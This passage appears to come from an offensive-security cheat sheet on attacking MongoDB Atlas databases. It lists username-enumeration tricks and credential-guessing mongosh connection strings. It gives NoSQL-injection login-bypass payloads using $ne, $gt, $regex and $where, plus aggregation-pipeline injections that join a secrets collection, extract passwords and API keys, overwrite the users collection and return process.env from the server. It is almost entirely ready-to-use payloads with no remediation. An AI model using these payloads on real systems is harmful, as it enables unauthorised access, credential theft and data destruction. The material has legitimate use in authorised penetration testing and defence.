<user_enumeration>
<enumeration_techniques>
{% raw %}
# Database user enumeration:

# Authentication error differences:
# "Authentication failed" - user exists, wrong password
# "User not found" - user doesn't exist

# Timing analysis:
# Valid username may take longer to reject

# Common Atlas usernames:
admin, root, mongodb, atlas, app, api, readonly, backup

# Built-in roles:
atlasAdmin, readWriteAnyDatabase, readAnyDatabase
dbAdmin, dbOwner, userAdmin

# Connection attempt with common users:
mongosh "mongodb+srv://admin:test@cluster.mongodb.net"
mongosh "mongodb+srv://root:test@cluster.mongodb.net"

# API key enumeration:
# Different error for invalid vs revoked keys
{% endraw %}
</enumeration_techniques>
</user_enumeration>

<injection_attacks>
<nosql_injection>
{% raw %}
# NoSQL injection in Atlas:

# Query operator injection:
# Instead of: {"username": "admin"}
# Inject: {"username": {"$ne": null}}

# Login bypass:
{"username": {"$gt": ""}, "password": {"$gt": ""}}

# Regular expression injection:
{"username": {"$regex": "^admin"}}

# Where clause injection:
{"$where": "this.username == 'admin'"}

# Array operators:
{"$or": [{"username": "admin"}, {"isAdmin": true}]}

# In URL parameters:
/api/users?username[$ne]=null
/api/search?query[$regex]=.*

# JSON injection:
{"field": "value", "$or": [{}]}
{% endraw %}
</nosql_injection>

<aggregation_injection>
{% raw %}
# Aggregation pipeline injection:

# If user input goes into aggregation:
# $match injection:
{"$match": {"status": {"$ne": "deleted"}}}
# Inject: {"status": {"$exists": true}}

# $lookup for unauthorized joins:
[
  {"$lookup": {
    "from": "secrets",
    "localField": "_id",
    "foreignField": "userId",
    "as": "secrets"
  }}
]

# $project for field extraction:
[{"$project": {"password": 1, "apiKey": 1}}]

# $out to write to arbitrary collection:
[{"$out": "attacker_collection"}]

# $merge for data manipulation:
[{"$merge": {"into": "users", "on": "_id", "whenMatched": "replace"}}]

# JavaScript injection in $function:
[{"$addFields": {"x": {"$function": {
  "body": "function() { return process.env }",
  "args": [],
  "lang": "js"
}}}}]
{% endraw %}
</aggregation_injection>
</injection_attacks>

